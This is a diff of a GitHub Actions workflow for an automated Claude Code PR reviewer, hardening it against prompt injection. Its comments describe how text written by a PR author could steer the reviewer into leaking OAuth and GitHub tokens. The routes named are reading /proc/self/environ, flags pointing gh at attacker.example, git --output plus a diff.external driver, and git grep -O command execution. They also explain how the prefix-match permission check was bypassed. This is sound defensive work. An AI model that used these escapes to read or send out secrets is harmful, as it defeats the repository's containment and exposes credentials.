@@ -27,34 +27,65 @@ name: claude-code-review
 #
 # PROMPT-INJECTION CONTAINMENT (DOR-464). The reviewer reads PR-authored text on
 # every run — the diff, commit messages, existing comments — so treat everything
-# it does as attacker-influenced. It therefore holds NO `gh` grant of its own:
-# all of its GitHub access goes through scripts/review-gh.sh, materialized from
-# the default branch (see "Materialize the trusted review helper"), which pins the
-# host, the repo and the PR number and takes only content as arguments. That is
-# strictly stronger than any allow-list pattern, because the Bash matcher is a
-# prefix match: it cannot forbid a trailing `--repo attacker.example/a/b`,
-# `--hostname attacker.example`, `-H "Authorization: Bearer $GH_TOKEN"` or
-# `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`, and only an exact match would try. What
-# this closed: `Bash(grep:*)` + `Bash(gh pr comment:*)` — dump /proc/self/environ,
-# post it — plus the quieter variants where `gh pr diff --repo HOST/OWNER/REPO`
-# reaches any host at all and `gh pr view --jq env.X` reads the environment
-# without grep. Either shape leaks CLAUDE_CODE_OAUTH_TOKEN and the OIDC App token,
-# which carries contents, pull_requests and issues WRITE.
+# it does as attacker-influenced.
 #
-# RESIDUAL RISK, accepted deliberately. Two things survive the above:
-#   1. The reviewer can still write anything into a comment BODY, and `$VAR`
-#      expansion means it can put a secret there without reading one first.
-#      Pinning the destination does not change that; it changes where the secret
-#      lands. A comment on this repo's own PR is loud and auditable — it is
-#      visible to every watcher, it notifies, and it stays in the comment history.
-#      Silent egress to a host of the model's choosing is what is gone. Anyone
-#      rotating a token leaked this way should assume the comment was read.
-#   2. `Bash(git log:*)` and `Bash(git show:*)` accept `--output=<file>`, which
-#      writes an arbitrary local path with arbitrary content (a PR-authored commit
-#      message is arbitrary content). They are kept because REVIEW.md has the
-#      reviewer trace history. The helper and its directory are therefore mode
-#      0500, so that primitive cannot rewrite the sink or drop a sibling beside
-#      it — without which the allow-list entry would point at a PR-authored file.
+# THE CONTAINMENT INVARIANT, which is the property to preserve and the thing to
+# check any change against: NO tool the reviewer is granted can execute a shell,
+# read the process environment, or reach the network of its own accord. Every
+# grant either stays inside the workspace (`Read`, `Grep`, `Glob`) or goes through
+# scripts/review-gh.sh, whose destination — host, repo, PR number, commit — is
+# fixed by this file and cannot be influenced by an argument. The allow-list is
+# asserted against an exact expected set in scripts/test-review-classifier.sh, so
+# adding a grant fails the harness until someone shows the new one holds the
+# invariant too.
+#
+# Why a helper rather than a tighter pattern: the Bash matcher is a PREFIX match.
+# It cannot forbid a trailing `--repo attacker.example/a/b`, `--hostname
+# attacker.example`, `-H "Authorization: Bearer $GH_TOKEN"` or
+# `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'` — only an exact match would, and it permits
+# extra flags plus `$VAR` expansion. Measured, all four.
+#
+# What violated the invariant before, all of it now gone:
+#   * `Bash(grep:*)` / `Bash(rg:*)` — `grep "" /proc/self/environ` reads the
+#     environment. Redundant with `Grep`/`Glob`/`Read`, which are workspace-bound.
+#   * `Bash(gh pr comment:*)` and the dispatch-only `Bash(gh api ...)` — a sink the
+#     model can re-aim with one trailing flag. `gh pr diff --repo HOST/OWNER/REPO`
+#     reaches ANY host, and `gh pr view --jq env.X` reads the environment without
+#     grep, so the read and the egress both survived removing only `grep`.
+#   * `Bash(git log:*)` / `Bash(git show:*)` — ARBITRARY COMMAND EXECUTION, not
+#     merely the "arbitrary local write" an earlier version of this comment
+#     claimed. `--output=<file>` writes any path with any content; git executes a
+#     `diff.external` / `GIT_EXTERNAL_DIFF` driver through `sh -c`; so writing
+#     `$HOME/.gitconfig` and then running `git show --ext-diff HEAD` runs the
+#     attacker's code with the job's full environment. Reproduced on git 2.53 in
+#     three commands, none containing a metacharacter the matcher sees (the payload
+#     sits inside single-quoted `--format` values), capturing both
+#     CLAUDE_CODE_OAUTH_TOKEN and GH_TOKEN.
+#   * `Bash(git grep:*)` — the same class in ONE command and with no config write
+#     at all, which makes it the worst of the three: `-O<cmd>` /
+#     `--open-files-in-pager=<cmd>` runs <cmd> through a shell. Reproduced on git
+#     2.53 with stdin closed (`git grep -O'echo x > /tmp/f' pat </dev/null`) — the
+#     redirection is what proves a shell rather than a bare exec; without
+#     `</dev/null` git tries to behave interactively and the effect is easy to miss.
+#     That this command refuses paths outside the repository, which is what an
+#     earlier version of this comment vouched for, was never the whole question:
+#     it was assessed as a file-READ primitive and `-O` was never considered.
+# Any one of those leaks CLAUDE_CODE_OAUTH_TOKEN and the OIDC App token, which
+# carries contents, pull_requests and issues WRITE.
+#
+# RESIDUAL RISK, accepted deliberately: the reviewer can still write anything it
+# likes into a comment BODY, and `$VAR` expansion means it can put a secret there
+# without reading one first. Pinning the destination does not change that; it
+# changes where the secret lands. A comment on this repo's own PR is loud and
+# auditable — visible to every watcher, it notifies, and it stays in the comment
+# history. Anyone rotating a token leaked that way should assume it was read.
+#
+# Note the shape of that claim. It is a consequence of the invariant, not an
+# independent guarantee: while no grant can execute a shell, the only place the
+# reviewer can put anything is this repo's own PR. Break the invariant and the
+# consequence goes with it — which is exactly what happened before this change,
+# when a comment here asserted that silent egress was gone while two grants in the
+# list were arbitrary code execution.
 #
 # KNOWN BLIND SPOT — a PR with merge conflicts gets NO review, and no red check
 # either (DOR-457). GitHub builds the test-merge ref (`refs/pull/N/merge`) before
@@ -311,8 +342,12 @@ jobs:
           # here already — fetch only if it is missing. Never with `--depth=1`:
           # fetching a branch shallow makes the WHOLE checkout shallow, which cut
           # `git rev-list --count` from 1765 to 1 and truncated `git log <path>` to a
-          # single entry. The reviewer holds `Bash(git log:*)` and REVIEW.md tells it
-          # to trace history, so shallowing the tree quietly degrades the review.
+          # single entry. That measurement was originally about the review itself,
+          # which no longer holds any `git` grant (DOR-464) and no longer depends on
+          # history — REVIEW.md never asked for it. It stays because THIS step and
+          # the materialize step below both read `origin/$DEFAULT_BRANCH` out of the
+          # object database, and a full fetch is the cheap way to be sure the objects
+          # they need are present.
           if ! git rev-parse --verify --quiet "refs/remotes/origin/$DEFAULT_BRANCH" >/dev/null; then
             if ! git fetch --no-recurse-submodules --no-tags origin \
               "+refs/heads/$DEFAULT_BRANCH:refs/remotes/origin/$DEFAULT_BRANCH"; then
@@ -358,16 +393,21 @@ jobs:
       # fixed it: `git show <ref>:<path>` reads the object database, so nothing the
       # PR does to the worktree — including deleting the script — can reach it.
       #
-      # Then locked down, because two grants the reviewer keeps are write
-      # primitives: `git log --output=<file>` and `git show --output=<file>` write
-      # an arbitrary path, and a PR-authored commit message is arbitrary content.
-      # Mode 0500 on the file stops either overwriting the helper; 0500 on the
-      # directory stops either dropping a sibling next to it, which is the other
-      # way to satisfy a prefix match (the matcher refuses that extension too; this
-      # is the second layer, not the only one). Verified locally: `git log
-      # --output=` onto a 0500 file fails with "could not open ... for writing:
-      # Permission denied". Nothing later in the job writes into this directory, and
-      # ubuntu-latest runners are ephemeral, so it needs no teardown.
+      # Then made read-only, file and directory (0500). Be honest about what that
+      # buys, because an earlier version of this comment oversold it: as long as the
+      # CONTAINMENT INVARIANT holds, no granted tool can write a file at all, so
+      # there is nothing for these permissions to stop. They mattered while
+      # `Bash(git log:*)`/`Bash(git show:*)` were granted — `--output=<file>` wrote
+      # any path — and even then they were the wrong layer, because those same
+      # grants could execute a shell and simply `chmod u+w` a directory the runner
+      # owns. So this is a cheap tripwire against a future write primitive, NOT a
+      # containment control; the control is the allow-list. Kept because it costs
+      # one line and closes the sibling-file route that a prefix match would accept
+      # (`review-gh.sh.evil`) if the matcher's refusal to extend a matched path ever
+      # regressed. Verified: `git log --output=` onto both the file and a `.evil`
+      # sibling fails with "Permission denied". Nothing later in the job writes into
+      # this directory, and ubuntu-latest runners are ephemeral, so it needs no
+      # teardown.
       #
       # BOOTSTRAP, once per rename: a PR that adds or renames scripts/review-gh.sh
       # gets a RED check here and no review, because the trusted copy does not exist
@@ -465,6 +505,24 @@ jobs:
           # `VAR=x cmd` prefix that would let a tool call override it.
           REVIEW_REPO: ${{ github.repository }}
           REVIEW_PR: ${{ steps.target.outputs.number }}
+          # DEFENCE IN DEPTH, not a control (DOR-464). These blunt one specific
+          # escalation: git executes a `diff.external` / `GIT_EXTERNAL_DIFF` driver
+          # through `sh -c`, and that driver is configurable from `$HOME/.gitconfig`
+          # — so anything able to write that file turns the next `git` invocation
+          # into arbitrary command execution. Pointing both config scopes at an
+          # empty file makes git ignore such a driver (measured: the same payload
+          # that ran without these did not run with them, and normal `git log` /
+          # `git show` still worked).
+          #
+          # It is deliberately NOT what closes that hole. The hole is closed by the
+          # allow-list below granting no `git` at all, and by no remaining grant
+          # being able to write a file in the first place. Treat these two lines as
+          # a seatbelt for a future grant that re-introduces git, and do not let
+          # their presence be used as an argument for re-adding one: a `git` grant
+          # would still reach `-O<cmd>` on `git grep`, which runs the pager through
+          # a shell with no config involved.
+          GIT_CONFIG_GLOBAL: /dev/null
+          GIT_CONFIG_SYSTEM: /dev/null
         with:
           claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
           # Plain-prompt review following Anthropic's "Automatic PR Code Review"
@@ -493,8 +551,13 @@ jobs:
             no flags. Nothing else about these commands is negotiable: extra
             flags, a different path, or `gh` on its own will all be refused. Below,
             `review-gh.sh <args>` is shorthand for one of the four lines above —
-            type the full command. To search, use Grep or `git grep`; bare `grep`
-            and `rg` are not available either.
+            type the full command.
+
+            To search the tree and read files, use the Grep, Glob and Read tools.
+            That helper is the ONLY shell command you have: there is no `gh`, no
+            `grep`, no `rg`, no `git`, no `ls`. Do not spend turns rediscovering
+            that — Grep and Glob cover every search this review needs, including the
+            dangling-reference sweep.
 
             First, read REVIEW.md and AGENTS.md at the repository root and apply
             them in full, including REVIEW.md's "How to review" process, the
@@ -533,7 +596,7 @@ jobs:
             removed identifier, in prose and config too) before concluding it is
             clean.
 
-            Verify each finding against the actual file (Grep, `git grep` or Read)
+            Verify each finding against the actual file (Grep or Read)
             before posting; drop anything you cannot cite with a `file:line`. A false
             Important costs the author a round trip.
 
@@ -587,30 +650,36 @@ jobs:
           # the reviewer's permissions come from --allowedTools instead — but it is a
           # real narrowing of protection, not a free one.
           #
-          # THE ALLOW-LIST (DOR-464). There is no `gh` in it. Every GitHub call the
-          # reviewer makes goes through the one helper materialized above, which
-          # pins host, repo and PR number and takes only content as arguments — see
-          # PROMPT-INJECTION CONTAINMENT in the header for the threat model and the
-          # residual, and scripts/review-gh.sh for the mechanics.
+          # THE ALLOW-LIST (DOR-464). Five entries, and exactly ONE of them is a
+          # Bash grant: the helper materialized above. Read the CONTAINMENT
+          # INVARIANT in the header before adding a sixth — the list is asserted
+          # against an exact expected set in scripts/test-review-classifier.sh, so
+          # any addition fails the harness on purpose.
           #
-          # Why not a narrower `gh` pattern instead: Claude Code's Bash matcher is a
-          # PREFIX match. It refuses chaining (`&&`, `;`, newline), command
-          # substitution, pipes, redirection and extending the matched path — all
-          # probed — but it ALLOWS extra flags on the same invocation, plus `$VAR`
-          # expansion. So no pattern short of an exact match can forbid
+          # Why not a narrower `gh` pattern instead of a helper: Claude Code's Bash
+          # matcher is a PREFIX match. It refuses chaining (`&&`, `;`, newline),
+          # command substitution, pipes, redirection and extending the matched path —
+          # all probed — but it ALLOWS extra flags on the same invocation, plus
+          # `$VAR` expansion. So no pattern short of an exact match can forbid
           # `--hostname attacker.example -H "Authorization: Bearer $GH_TOKEN"`,
           # `--repo attacker.example/a/b` (measured: `gh pr diff` and `gh pr view`
           # connect to any host given one) or `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`
           # (measured: prints the process environment, no grep required). A
           # fixed-shape helper removes the choice rather than pattern-matching it.
           #
-          # `Bash(grep:*)` and `Bash(rg:*)` are gone with it. They were the
-          # `grep "" /proc/self/environ` half of the original exfil, and they were
-          # already redundant: `Grep`, `Glob` and `Read` are granted below and are
-          # confined to the workspace. `Bash(git grep:*)` stays — REVIEW.md tells
-          # the reviewer to `git grep`, and unlike bare grep it refuses paths
-          # outside the repository even with `--no-index` (verified: "is outside
-          # repository"), so it is not the same read primitive.
+          # What the reviewer lost, and why nothing needed replacing. `grep` and `rg`
+          # were the `/proc/self/environ` read; `git log`, `git show` and `git grep`
+          # were arbitrary command execution (header). `Read`, `Grep` and `Glob` are
+          # granted below, are workspace-confined, and cover every search REVIEW.md
+          # actually asks for: its four process steps want the diff, the changed-file
+          # list, the enclosing code, and a search for callers of changed symbols.
+          # REVIEW.md asks for no history at all — the claim that it "tells the
+          # reviewer to trace history" was this file's, not REVIEW.md's — so no
+          # `log`/`show` subcommand was added to the helper to replace them. Every
+          # subcommand is surface that has to be proved shell-free; the cheapest way
+          # to keep that proof short is to not add one for a capability nothing needs.
+          # `Bash(ls:*)` went too: `Glob` does it, and one fewer entry is one fewer
+          # thing to vouch for.
           #
           # One line now, not two. The dispatch-only grant that used to sit here
           # existed because the action registers the github_inline_comment MCP
@@ -620,7 +689,7 @@ jobs:
           # `inline` subcommand covers both triggers, so the fallback no longer
           # needs a trigger-conditional grant of its own.
           claude_args: |
-            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(bash ${{ runner.temp }}/trusted/review-gh.sh:*),Bash(git grep:*),Bash(git log:*),Bash(git show:*),Bash(ls:*),Read,Grep,Glob"
+            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(bash ${{ runner.temp }}/trusted/review-gh.sh:*),Read,Grep,Glob"
             --setting-sources user
             --max-turns ${{ steps.pr-size.outputs.max_turns }}
 
